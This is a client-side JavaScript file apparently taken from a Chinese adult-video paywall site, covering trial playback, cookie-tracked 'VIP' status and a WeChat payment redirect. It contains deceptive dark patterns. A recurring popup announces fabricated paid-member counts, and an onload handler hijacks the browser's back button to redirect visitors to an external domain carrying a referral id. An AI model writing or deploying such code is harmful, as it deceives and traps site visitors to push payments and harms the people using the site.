function vippop() {
    debug && console.log("ispay==1");
    var i = $.dialog({
        title: "恭喜您成为VIP会员",
        diagid: "sayhi",
        content: "您现在已获得：<ul><li>精心挑选的美女直播视频与女优写真</li></ul><p><small>＊本站内容仅供欣赏，不涉及非法内容，请谅解</small></p>",
        button: ["我知道了"]
    });
    ispay = _ispay = 2,
    setCookie("ispay", _ispay, "d7"),
    setCookie("trymp4", "", "d7"),
    i.on("dialog:action",
    function(i) {
        0 === i.index && (window.location.href = "index.html")
    })
}

function gopay() {
    "undefined" != typeof player && player.remove();
    var i = $.dialog({
        title: "温馨提示",
        content: "非会员只能试看20秒视频哦~",
        button: ["待会充", "去充值"]
    });
    i.on("dialog:action",
    function(i) {
        0 === i.index ? window.location.href = "./index.html?time="+(new Date()).valueOf(): window.location.href = "./check.html?time="+(new Date()).valueOf();
    })
}
function getNo() {
    var i = "x_a_no",
    o = 1285,
    e = getCookie(i);
    e ? (_ckno = parseInt(e) + 1, setCookie(i, _ckno, "d30")) : setCookie(i, o, "d30"),
    e = e ? _ckno: o,
    $("#showno").html(e);
    var t = $(".ui-newstips-wrap");
    t.show().addClass("flip-top"),
    setTimeout(function() {
        t.hide()
    },
    5e3)
}
function getQuery(i) {
    var o = new RegExp("(^|&)" + i + "=([^&]*)(&|$)", "i"),
    e = window.location.search.substr(1).match(o);
    return null !== e ? unescape(e[2]) : null
}
function getProid() {
    var i = location.pathname;
    return arr = i.split("/"),
    arr[1]
}
function setCookie(i, o, e) {
    var t = getsec(e),
    a = new Date;
    a.setTime(a.getTime() + 1 * t),
    document.cookie = i + "=" + escape(o) + ";expires=" + a.toGMTString()
}
function getCookie(i) {
    var o, e = new RegExp("(^| )" + i + "=([^;]*)(;|$)");
    return o = document.cookie.match(e),
    o ? o[2] : null
}
function getsec(i) {
    var o = 1 * i.substring(1, i.length),
    e = i.substring(0, 1);
    return "s" == e ? 1e3 * o: "h" == e ? 60 * o * 60 * 1e3: "d" == e ? 24 * o * 60 * 60 * 1e3: void 0
}
function uuid(i, o) {
    var e, t = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".split(""),
    a = [];
    if (o = o || t.length, i) for (e = 0; i > e; e++) a[e] = t[0 | Math.random() * o];
    else {
        var n;
        for (a[8] = a[13] = a[18] = a[23] = "-", a[14] = "4", e = 0; 36 > e; e++) a[e] || (n = 0 | 16 * Math.random(), a[e] = t[19 == e ? 3 & n | 8 : n])
    }
    return a.join("")
}
function insertPlayer(i, o) {
    arguments[1] || (o = "player"),
    o = "play_files/images/" + o + ".jpg";
    var e = '<video autoplay="autoplay" preload="auto" id="player" controls="false" poster="' + o + '" style="width:100%;height:100%;"><source src="' + i + '" type="video/mp4"></source></video>';
    $("#playerwrap").html(e)
}
function checkPay(i, o, e, t, a) {	
	if(orderid==0)
		return;
    return debug && console.log("checkPay:" + i + "," + o + "," + e + "," + a),
    $.ajax({
        type: "get",
        url: i,
        async: !0,
        data: {
            apiurl: i,
            reqtype: "ispay",
            uid: o,
            proid: e,
            site: t,
            source: a
        },
        dataType: "jsonp",
        timeout: 9e4,
        success: function(i) {
            return debug && console.log("check ispay status:" + i.status),
            1e4 == i.status && (setCookie("ispay", 1, "d7"), vippop()),
            !0
        }
    }),
    !1
}
function requestPay(i, o, e, t, a, n, s) {
	 url=i+"?uid="+e;	 
	 $(".ui-btn-weixin").attr("href",url), s && (s.loading("hide"), jumptowx(url)), debug && console.log("get paylink status:" + 1), setCookie("paylink", url, "s300");
	 
}
function jumptowx(i) { - 1 == ispay && (ispay = 0),
    setCookie("ispay", ispay, "d7"),
    window.location.href = i;
   
       /** var o = $.dialog({
        content: "支付成功后请点击完成按钮",
        diagid: "isok",
        button: ["取消", "完成"]
    }); 

o.on("dialog:action",
    function(i) {
        1 == i.index ? window.location.href = "./check.html": window.location.href = "./check.html"
    })**/

}
function getQueryString(name) {
    var reg = new RegExp('(^|&)' + name + '=([^&]*)(&|$)', 'i');
    var r = window.location.search.substr(1).match(reg);
    if (r != null) {
        return unescape(r[2]);
    }
    return null;
}


var ispay = -1,
proid = 111,
resourceDomain = "http://www.jiancaihangye.com/movies/",
uid = "",
orderid=getQueryString('orderid')?getQueryString('orderid'):0,
apiurl = "/index/pay",
apiurl1 = '',//"http://m.myrings.cn/app/index.php/pay?order="+orderid,
apiurl2 = '',//"http://www.jiangzhendong.com/wxpay/pay/pay.php",
site = 1,
paytype = "my",
source = "iw",
debug = !1,
openid=0,
gid = 0,
refid = 0,
rhost='',
inBrowser = "undefined" != typeof window && "[object Object]" !== Object.prototype.toString.call(window),
UA = inBrowser && window.navigator.userAgent.toLowerCase(),
isMQQBrowser = UA && UA.indexOf("mqqbrowser/") > 0,
_uid = getCookie("uid");


if(orderid>0){
	ispay=0;
	setCookie("ispay", 0, "d7");
}
 
if (typeof getQueryString("openid") == "string") {
    openid = getQueryString("openid") ? getQueryString("openid") : getCookie("openid");
    setCookie('openid',openid, "d999");

if (typeof getQueryString("gid") == "string") {
    gid = getQueryString("gid") ? getQueryString("gid") : getCookie("gid");
    setCookie('gid',gid, "d999");
}

if (typeof getQueryString("rhost") == "string") {
    rhost = getQueryString("rhost") ? getQueryString("rhost") : getCookie("rhost");
    setCookie('rhost',rhost, "d999");
}

if (typeof getQueryString("refid") == "string") {
    refid = getQueryString("refid") ? getQueryString("refid") : getCookie("refid");
    setCookie('refid',refid, "d999");
}

}
null !== _uid ? (uid = _uid, debug && console.log("get uid:" + uid)) : (_uid = uuid(16, 32), setCookie("uid", _uid, "d30"), debug && console.log("set uid cookie:" + _uid), uid = _uid);


var _proid = getProid();
null !== _proid ? (proid = _proid, setCookie("proid", _proid, "d30")) : getCookie("proid") && (proid = getCookie("proid"));
var _ispay = getCookie("ispay");
null !== _ispay && (ispay = parseInt(_ispay), 0 === ispay && checkPay(apiurl1, uid, proid, site, source)),
debug && console.log("get ispay:" + ispay);
var iftry = getCookie("trymp4");
iftry || "" === iftry || setCookie("trymp4", "try1|try2|try3|try4|try5", "d999"),
debug && console.log("ispay before:" + ispay),
1 == ispay && vippop();
var newstips = '<div id="newstips" class="ui-newstips-wrap"><div class="ui-newstips"><i class="ui-icon-checked-s"></i><div>第<span id="showno"></span>位会员充值成功！</div></div></div>';
if ($(function() {
    1 > ispay && ($("body").append(newstips), setInterval(getNo, 1e4))
}), $(function() {
    $("#qqvideo-overlay-0,#qqvideobridge").remove()
}), $("#header li").on("click",
function() {
    $(this).data("href")+"?time="+ new Date()  && (location.href = $(this).data("href") +"?time="+ new Date()  )
}), $("#return").on("click",
function() {
    window.location.href = "./index.html?time = " + new Date()
}), !/(check|about|play)/i.test(location.pathname)) {
    var slider = new fz.Scroll(".ui-slider", {
        role: "slider",
        indicator: !0,
        autoplay: !0,
        interval: 3e3
    });
	
    if ($("#slider li, #vlist li").on("click",
    function() {	
        var i = resourceDomain + "mp4/" + $(this).data("vid") + ".mp4",
        o = $(this).children("h4").html();
        if ("" !== iftry || ispay > 0) window.location.href = "./play.html?title=" + o + "&mp4=" + i + "&openid="+ openid;
        else {
            var e = '<div id="paybox"class="ui-dialog"><div class="ui-dialog-cnt"><a class="ui-icon-close-page"data-role="button"></a><div class="info"><h4>试看结束,充值VIP观看更多高清爽片</h4><p class="ui-txt-red">（只需支付一次，享受所有影片观看权限！）</p><p>VIP注意事项：<br>1.未满18岁用户，禁止购买观看。<br>2.一次性支付，享有所有影片观看权限。<br><div class="payBtn"><a class="paybtn weixin"data-role="button">确定</a></div></div></div></div>';
            $("body").append(e);
            var t = $("#paybox").dialog("show");
            t.on("dialog:action",
            function(i) {
                1 == i.index && (window.location.href = "./check.html?time="+(new Date()).valueOf())
            })
        }
        return ! 1
    }), 1 > ispay) {
        var novipfooter = '<div id="novipfooter" style="text-align:center; font-size:16px;">更多精华资源，仅限会员专享。。。</div>';
        $(function() {
            $("body").append(novipfooter),
            $("#novipfooter").on("click",
            function() {
                window.location.href = "./check.html?time="+(new Date()).valueOf()
            })
        })
    }
}
if (/play/i.test(location.pathname)) if ($("#playerwrap").css({
    width: $(window).width() + "px",
    height: $(window).height() - 300 + "px"
}), 1 > ispay) {
    $("#playTip").html('非会员只能试看20秒，<a href="./check.html?time='+(new Date()).valueOf()+'">成为会员</a>观看全部'),
    $("#playTip2").html('<a href="./check.html?time='+(new Date()).valueOf()+'"><i class="ui-icon-star"></i>立即成为会员获得更多福利<i class="ui-icon-arrow"></i></a>');
    var trymp4 = decodeURI(getCookie("trymp4")).split("|"),
    idx = Math.floor(Math.random() * trymp4.length);
    if (trymp4[0]) {
        var _mp4 = resourceDomain + "mp4/" + trymp4[idx] + ".mp4";
        debug && console.log(_mp4),
        insertPlayer(_mp4, trymp4[idx]),
        player = document.getElementById("player"),
        player.onplay = function() {
            1 > ispay && setTimeout(gopay, 2e4)
        }
    } else gopay();
    trymp4.splice(idx, 1),
    _trymp4 = trymp4.join("|"),
    setCookie("trymp4", _trymp4, "d999")
} else if (ispay > 0) {
    $("#playTip").html("您正在观看会员专享视频，请耐心等待缓冲"),
    $("#playTip2").hide();
    var vipmp4 = getQuery("mp4");
    debug && console.log("get vip mp4:" + vipmp4),
    insertPlayer(vipmp4)
}
if (/check/i.test(location.pathname)) {
    var img = ["b1.gif", "b2.gif"],
    idx = Math.floor(2 * Math.random()),
    videoimgHeight = $(".videoimg").width() / 1.97;
    debug && console.log(videoimgHeight),
    $(".videoimg").css("height", videoimgHeight).html('<img src="http://obkku88wo.qnssl.com/Svoid/play_files/' + img[idx] + '" width="100%">'),
    debug && console.log("get paylink:" + getCookie("paylink"));
    rhost  = getCookie("rhost") ? getCookie("rhost") : 'order.tcncn.com';
    var apiurl = "http://"+ rhost + apiurl;
	var paylink=apiurl+"?openid="+getCookie("openid")+ "&ruel=" + location.href + "&money=48&gid="+ getCookie("gid") + "&refid=" + getCookie("refid");
	$(".ui-btn-weixin").attr("href",paylink);	
    $(".ui-btn-weixin").on("click",
    function() {
        if ("" !== paylink) debug && console.log("got paylink:" + $(this).data("href")),
        jumptowx(paylink);
        else {
            var i = $('<div id="payloading" class="ui-loading-block show"><div class="ui-loading-cnt"><i class="ui-loading-bright"></i><p>若长时间未跳转<br><em onclick="javascript:location.reload();">请点此刷新</em></p></div></div>').loading();
            debug && console.log("no paylink"),
            requestPay(apiurl, paytype, uid, proid, site, source, i)
        }
    })
}
if (/about/i.test(location.pathname)) {
    var contactus = '<details><summary class="contactus"><h3 style="display:inline-block">联系我们</h3></summary><p>如有任何意见或疑问，请联系客服</p><p><img src="' + resourceDomain + '/m/contact.jpg" height="78" width="250" alt=""></p></details>';
    ispay > 0 && $(".about").prepend(contactus)
}
var reqcount = 0;

 

 
window.onload = function(){
   window.setTimeout(function(){history.pushState(null, null, "#tuit");window.onpopstate = function(){window.location.href = "http://" + rhost + "/?d=" + window.btoa(refid); return false;};},1000);
}